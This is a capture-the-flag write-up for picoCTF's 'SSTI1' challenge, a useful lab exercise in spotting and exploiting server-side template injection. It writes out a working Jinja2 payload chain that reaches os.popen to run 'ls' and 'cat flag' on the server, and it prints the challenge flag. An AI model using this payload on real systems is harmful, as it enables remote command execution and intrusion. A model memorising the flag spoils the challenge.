# SSTI1 Writeup

## Challenge Description

I made a cool website where you can announce whatever you want! Try it out!  I heard templating is a cool and modular way to build web apps!  [Challenge Link](https://play.picoctf.org/practice/challenge/492)

## Vulnerability Explanation

The description hinted at user input being rendered using a server-side template engine, especially with the phrase "templating is a cool and modular way…". This suggested a potential Server-Side Template Injection (SSTI) vulnerability.

## Steps to Solve

1. **Initial Analysis**  
    I tested for SSTI by submitting the following as an announcement:  

    ```jinja
    {{7*7}}
    ```  

    The output displayed `49`, confirming that the template engine evaluates input and that the backend is likely using Jinja2, a popular Python templating engine.

2. **Exploiting the Vulnerability**  
    Jinja2’s template context exposes access to Python internals via special object paths. Using a known SSTI payload chain, I was able to execute system commands on the server.  

    First, I used the following payload to explore the directory structure:  

    ```jinja
    {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
    ```  

    - `self._TemplateReference__context` exposes the template's context.  
    - `cycler.__init__.__globals__` provides access to the global Python namespace.  
    - From there, I imported `os` and used the `popen` method to execute shell commands.  

    This revealed a file named `flag` in the working directory.  

3. **Retrieving the Flag**  
    To read the contents of the `flag` file, I used the following payload:  

    ```jinja
    {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
    ```  

## Flag

The payload successfully revealed the flag:  

```plaintext
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5c985a9a}
```
